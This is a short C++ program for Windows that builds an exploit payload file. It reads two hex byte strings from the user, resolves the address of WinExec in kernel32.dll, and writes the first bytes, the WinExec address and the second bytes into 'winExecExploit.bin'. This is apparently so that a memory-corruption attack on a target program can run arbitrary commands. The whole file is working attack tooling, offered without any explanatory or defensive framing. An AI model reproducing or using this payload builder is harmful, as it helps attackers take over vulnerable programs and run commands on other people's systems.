#include <Windows.h>
#include <fstream>
#include <iomanip>
#include <iostream>
#include <sstream>
#include <string>
#include <vector>
#include <chrono>
#include <thread>

std::vector<unsigned char> hex_string_to_bytes(const std::string &hex_string) {
    std::vector<unsigned char> bytes;

    for (size_t i = 0; i < hex_string.length(); i += 2) {
        unsigned int byte = std::stoul(hex_string.substr(i, 2), nullptr, 16);
        bytes.push_back(static_cast<unsigned char>(byte));
    }

    return bytes;
}

int main() {
    std::string input_data1, input_data2;

    std::cout << "Enter before address: ";
    std::getline(std::cin, input_data1);

    std::cout << "Enter after address: ";
    std::getline(std::cin, input_data2);

    std::vector<unsigned char> input_bytes1 = hex_string_to_bytes(input_data1);
    std::vector<unsigned char> input_bytes2 = hex_string_to_bytes(input_data2);

    HMODULE h_kernel32 = GetModuleHandle("kernel32.dll");
    FARPROC win_exec_addr = GetProcAddress(h_kernel32, "WinExec");

    std::ofstream bin_file("winExecExploit.bin", std::ios::binary | std::ios::out);

    if (!bin_file) {
        std::cerr << "Error: Unable to create the .bin file" << std::endl;
        return 1;
    }

    bin_file.write(reinterpret_cast<const char *>(input_bytes1.data()), input_bytes1.size());
    bin_file.write(reinterpret_cast<const char *>(&win_exec_addr), sizeof(win_exec_addr));
    bin_file.write(reinterpret_cast<const char *>(input_bytes2.data()), input_bytes2.size());
    bin_file.close();

    std::cout << "The exploit has been crated." << std::endl;

    std::this_thread::sleep_for(std::chrono::seconds(3));
    return 0;
}
